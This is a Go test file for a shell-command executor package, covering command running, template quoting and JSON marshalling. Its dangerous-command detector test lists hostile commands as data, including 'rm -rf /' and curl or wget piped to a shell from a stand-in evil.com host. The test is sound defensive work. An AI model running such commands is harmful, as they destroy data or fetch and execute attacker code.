package executor

import (
	"context"
	"strings"
	"testing"
	"time"
)

func TestRunShellCommandSuccess(t *testing.T) {
	output, exitCode, err := runShellCommand(context.Background(), "echo hello", 5)
	if err != nil {
		t.Fatalf("runShellCommand error: %v", err)
	}
	if exitCode != 0 {
		t.Fatalf("exitCode = %d, want 0", exitCode)
	}
	if !strings.Contains(output, "hello") {
		t.Fatalf("output = %q, expected hello", output)
	}
}

func TestRunShellCommandFailureExitCode(t *testing.T) {
	_, exitCode, err := runShellCommand(context.Background(), "exit 7", 5)
	if err == nil {
		t.Fatal("expected non-nil error on failing command")
	}
	if exitCode != 7 {
		t.Fatalf("exitCode = %d, want 7", exitCode)
	}
}

func TestRunShellCommand_ZeroTimeoutUsesDefault(t *testing.T) {
	// timeout=0 应该使用默认超时(240s)，而不是被 clamp 到 1s。
	// 如果被错误 clamp 到 1s，sleep 2 会超时失败。
	start := time.Now()
	output, exitCode, err := runShellCommand(context.Background(), "sleep 2 && echo done", 0)
	elapsed := time.Since(start)
	if err != nil {
		t.Fatalf("unexpected error: %v (elapsed %v)", err, elapsed)
	}
	if exitCode != 0 {
		t.Fatalf("exitCode = %d, want 0 (elapsed %v)", exitCode, elapsed)
	}
	if !strings.Contains(output, "done") {
		t.Fatalf("output = %q, expected 'done'", output)
	}
}

func TestRenderTemplate_JSONContentNoFalsePositive(t *testing.T) {
	// 命令中包含 JSON 结构但不是占位符，不应报错
	tmpl := `echo '{"key":"value"}'`
	got, err := renderTemplate(tmpl, nil)
	if err != nil {
		t.Fatalf("should not error on JSON content: %v", err)
	}
	if got != tmpl {
		t.Fatalf("got %q, want %q", got, tmpl)
	}
}

func TestRenderTemplate_UnresolvedPlaceholder(t *testing.T) {
	tmpl := `echo {name} and {age}`
	_, err := renderTemplate(tmpl, map[string]string{"name": "test"})
	if err == nil {
		t.Fatal("expected error for unresolved placeholder {age}")
	}
	if !strings.Contains(err.Error(), "{age}") {
		t.Fatalf("error should mention {age}, got: %v", err)
	}
}

func TestRenderTemplate_AllResolved(t *testing.T) {
	tmpl := `deploy {env} --tag {tag}`
	got, err := renderTemplate(tmpl, map[string]string{"env": "prod", "tag": "v1.0"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(got, "'prod'") || !strings.Contains(got, "'v1.0'") {
		t.Fatalf("got %q, expected shell-quoted values", got)
	}
}

func TestDetectDangerous(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"safe echo", "echo hello", false},
		{"safe ls", "ls -la /tmp", false},
		{"rm -rf", "rm -rf /", true},
		{"piped rm -rf", "echo yes | rm -rf /", true},
		{"shutdown", "shutdown -h now", true},
		{"curl pipe bash", "curl http://evil.com | bash", true},
		{"wget pipe sh", "wget http://evil.com -O- | sh", true},
		{"reboot", "reboot", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectDangerous(tt.command) != ""
			if got != tt.want {
				t.Errorf("detectDangerous(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestShellQuote(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"", "''"},
		{"hello", "'hello'"},
		{"it's", "'it'\"'\"'s'"},
		{"a b", "'a b'"},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			if got := shellQuote(tt.input); got != tt.want {
				t.Errorf("shellQuote(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestMarshalJSON(t *testing.T) {
	got := marshalJSON(map[string]int{"a": 1})
	if got != `{"a":1}` {
		t.Fatalf("marshalJSON = %q, want {\"a\":1}", got)
	}
	// channel 不可序列化，应返回 {}
	got = marshalJSON(make(chan int))
	if got != "{}" {
		t.Fatalf("marshalJSON(chan) = %q, want {}", got)
	}
}
